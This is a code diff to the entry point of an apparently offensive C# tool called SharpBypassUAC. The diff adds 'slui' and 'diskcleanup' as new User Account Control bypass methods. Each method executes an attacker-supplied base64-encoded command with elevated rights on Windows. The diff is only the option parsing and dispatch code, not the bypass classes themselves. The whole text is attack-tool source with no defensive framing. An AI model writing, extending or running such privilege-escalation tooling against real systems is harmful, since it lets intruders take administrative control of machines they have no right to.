@@ -18,7 +18,7 @@ namespace SharpBypassUAC
 
             var options = new OptionSet()
             {
-                {"b|bypass=", "Bypass to execute: eventvwr, fodhelper, sdclt, sdclt-kickoffelev", v => bypass = v },
+                {"b|bypass=", "Bypass to execute: eventvwr, fodhelper, sdclt, slui", v => bypass = v },
                 {"e|encodedCommand=", "Base64 encoded command to execute", v => encodedCommand = Convert.FromBase64String(v) },
                 { "h|?|help", "Show this help", v => help = true }
             };
@@ -50,6 +50,15 @@ namespace SharpBypassUAC
                 {
                     Sdclt sdclt = new Sdclt(encodedCommand);
                 }
+                else if (bypass.ToLower().Equals("slui"))
+                {
+                    Slui slui = new Slui(encodedCommand);
+                }
+                else if (bypass.ToLower().Equals("diskcleanup"))
+                {
+                    DiskCleanup diskcleanup = new DiskCleanup(encodedCommand);
+                }
+
             }
             catch (Exception e)
             {
